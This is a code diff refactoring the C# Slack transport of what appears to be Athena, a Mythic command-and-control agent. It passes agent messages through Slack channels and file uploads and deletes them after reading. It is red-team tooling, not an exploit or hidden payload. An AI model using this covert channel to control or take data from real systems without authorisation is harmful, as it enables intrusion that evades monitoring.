@@ -115,6 +115,7 @@ namespace Athena.Config
         private async Task<bool> JoinChannel()
         {
             string data = "{\"channel\": \"" + this.channel + "\"}";
+
             return await SendPost("https://slack.com/api/conversations.join", data);
         }
         public async Task<string> Send(object obj)
@@ -139,14 +140,13 @@ namespace Athena.Config
                 {
                     if (i == this.messageChecks)
                     {
-                        current_message = "";
-                        return "";
+                        return String.Empty;
                     }
                     i++;
                 }
 
                 Dictionary<string, MythicMessageWrapper> result;
-                json = "";
+                json = String.Empty;
                 i = 0;
 
                 //Give the server a second to respond.
@@ -171,35 +171,27 @@ namespace Athena.Config
                 }
                 else
                 {
-                    current_message = "";
-                    return "";
+                    return String.Empty;
                 }
 
                 //Delete the messages we've read successfully and indicate we're not waiting for a response anymore
-                DeleteMessages(result.Keys.ToList<string>());
-
-                //Indicate we're done with the current message
-                current_message = "";
-
+                DeleteMessages(result.Keys.ToList());
+                
                 if (this.encrypted)
                 {
                     return this.crypt.Decrypt(json);
                 }
-                else
+
+                if (!string.IsNullOrEmpty(json))
                 {
-                    if (String.IsNullOrEmpty(json))
-                    {
-                        return json;
-                    }
-                    else
-                    {
-                        return (await Misc.Base64Decode(json)).Substring(36);
-                    }
+                    return (await Misc.Base64Decode(json)).Substring(36);
                 }
+
+                return String.Empty;
             }
             catch (Exception e)
             {
-                return "";
+                return String.Empty;
             }
         }
         private async Task<bool> SendSlackMessage(string data)
@@ -212,7 +204,7 @@ namespace Athena.Config
                 msg = new MythicMessageWrapper()
                 {
                     sender_id = this.agent_guid,
-                    message = "",
+                    message = String.Empty,
                     to_server = true,
                     id = 1,
                     final = true
@@ -253,7 +245,7 @@ namespace Athena.Config
         {
             string url = "https://slack.com/api/files.upload";
             //Wait for webclient to become available
-            while (this.webClient.IsBusy) ; ;
+            while (this.webClient.IsBusy) ;
 
             //Add file parameters, will probably need to change these
             var parameters = new NameValueCollection();
@@ -273,9 +265,6 @@ namespace Athena.Config
                 {
                     string strRes = System.Text.Encoding.UTF8.GetString(res);
                     FileUploadResponse fur = JsonConvert.DeserializeObject<FileUploadResponse>(strRes);
-
-                    //Indicate that a file has been marked for uploading.
-                    current_message = fur.file.timestamp.ToString();
                 }
                 catch (Exception e)
                 {
@@ -297,12 +286,11 @@ namespace Athena.Config
                     {
                         await Task.Delay(this.timeBetweenChecks * 1000);
                     }
-                    return false;
                 }
                 return false;
             }
         }
-        private async Task<bool> DeleteMessages(List<string> messages)
+        private async Task DeleteMessages(List<string> messages)
         {
             // This works for the current implemenation but may have to change in the event I need to further chunk messages.
             bool success = false;
@@ -312,14 +300,11 @@ namespace Athena.Config
                 success = await SendPost("https://slack.com/api/chat.delete", data);
                 await Task.Delay(1000);
             }
-
-
-            return success;
         }
         private async Task<Dictionary<string, MythicMessageWrapper>> GetSlackMessages()
         {
             Dictionary<string, MythicMessageWrapper> messages = new Dictionary<string, MythicMessageWrapper>();
-            string res = "";
+            string res = String.Empty;
             ConversationHistoryResponse msgResponse;
 
             for (int i = 0; i < this.messageChecks; i++) //Keep submitting web request until it works or we hit our max checks
@@ -444,7 +429,7 @@ namespace Athena.Config
 
             try
             {
-                return this.webClient.DownloadString(url) ?? "";
+                return this.webClient.DownloadString(url) ?? String.Empty;
             }
             catch (WebException e)
             {
@@ -462,14 +447,14 @@ namespace Athena.Config
                             //Default wait 10s
                             await Task.Delay(10000);
                         }
-                        return "";
+                        return String.Empty;
                     }
                 }
-                return "";
+                return String.Empty;
             }
             catch (Exception ex)
             {
-                return "";
+                return String.Empty;
             }
 
         }
